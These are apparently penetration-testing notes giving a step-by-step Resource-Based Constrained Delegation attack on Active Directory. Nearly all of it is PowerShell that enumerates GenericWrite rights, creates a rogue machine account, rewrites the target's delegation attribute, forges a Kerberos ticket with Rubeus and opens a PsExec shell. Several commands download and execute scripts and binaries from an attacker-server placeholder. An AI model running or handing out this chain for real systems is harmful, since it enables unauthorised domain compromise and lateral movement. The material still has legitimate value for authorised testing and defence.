# <h1 align="center" id="heading">Resource-Based Constrained Delegation</h1>
In order to exploit RBCD, I need to find a system or user that has GenericWrite privileges over another system. I can use the following command to enumerate this privilege:
```powershell
iex(new-object system.net.webclient).downloadstring("http://<attacker_server>/PowerView.ps1");Get-DomainComputer | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq $("$env:UserDomain\$env:Username")) {$_}}
```
Once I find a viable target, I will need to run the following commands to create a new machine account using PowerMad:
```powershell
iex(new-object system.net.webclient).downloadstring('http://<attacker_server>/Powermad.ps1');New-MachineAccount -MachineAccount MyComputer -Password $(ConvertTo-SecureString 'Password1234!' -AsPlainText -Force) -Verbose
```
After creating a new computer accont, I can run the following command to verify the account was created:
```powershell
iex(new-object system.net.webclient).downloadstring('http://<attacker_server>/PowerView.ps1');Get-DomainComputer -Identity MyComputer
```
I will then use the following commands to perform the exploit:
```powershell
$sid =Get-DomainComputer -Identity MyComputer -Properties objectsid | Select -Expand objectsid
```
```powershell
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($sid))"
```
```powershell
$SDbytes = New-Object byte[] ($SD.BinaryLength)
```
```powershell
$SD.GetBinaryForm($SDbytes,0)
```
```powershell
iex(new-object system.net.webclient).downloadstring('http://<attacker_server>/PowerView.ps1');Get-DomainComputer -Identity <target system> | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
```
```powershell
iex(new-object system.net.webclient).downloadstring('http://<attacker_server>/PowerView.ps1');$RBCDbytes = Get-DomainComputer <target system> -Properties 'msds-allowedtoactonbehalfofotheridentity' | select -expand msds-allowedtoactonbehalfofotheridentity
```
```powershell
$Descriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $RBCDbytes, 0
```
```powershell
$Descriptor.DiscretionaryAcl
```
I will now run the following command to download Rubeus to the target system:
```powershell
wget http://<attacker server>/rubeus.exe -outfile ./rubeus.exe
```
I will use the following command to create a hash for my password that I set for the computer account:
```powershell
.\rubeus.exe hash /password:Password1234!
```
I can now perform a PTT to the target system with the following command:
```powershell
.\rubeus.exe s4u /user:MyComputer$ /rc4:<password hash> /impersonateuser:<target user> /msdsspn:CIFS/<target system> /ptt
```
I will now download PSExec64.exe to the target with the following command:
```powershell
wget http://<attacker server>/PsExec64.exe -outfile ./PsExec64.exe
```
I can run the following command to check to see if I can make use of the ticket:
```powershell
dir \\<target system>\c$
```
I will now launch an admin cmd.exe, re-PTT, and run the following command to establish a PSExec session on the target system:
```powershell
PsExec64.exe \\<target system> cmd
```
